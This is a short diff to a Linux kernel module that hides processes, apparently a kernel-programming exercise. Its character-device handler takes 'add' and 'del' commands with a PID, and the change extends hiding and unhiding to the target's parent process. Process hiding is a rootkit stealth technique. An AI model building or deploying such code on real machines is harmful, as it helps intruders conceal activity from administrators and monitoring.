@@ -1,3 +1,5 @@
+#include "common.h"
+
 #include <linux/cdev.h>
 #include <linux/ftrace.h>
 #include <linux/kallsyms.h>
@@ -194,6 +196,7 @@ static ssize_t device_write(struct file *filep,
 {
     long pid;
     char *message;
+    pid_t ppid;
 
     char add_message[] = "add", del_message[] = "del";
     if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
@@ -205,9 +208,17 @@ static ssize_t device_write(struct file *filep,
     if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
         kstrtol(message + sizeof(add_message), 10, &pid);
         hide_process(pid);
+        // hide also the parent process
+        ppid = get_ppid_by_pid(pid);
+        if (ppid)
+            hide_process(ppid);
     } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
         kstrtol(message + sizeof(del_message), 10, &pid);
         unhide_process(pid);
+        // unhide also the parent process
+        ppid = get_ppid_by_pid(pid);
+        if (ppid)
+            unhide_process(ppid);
     } else {
         kfree(message);
         return -EAGAIN;
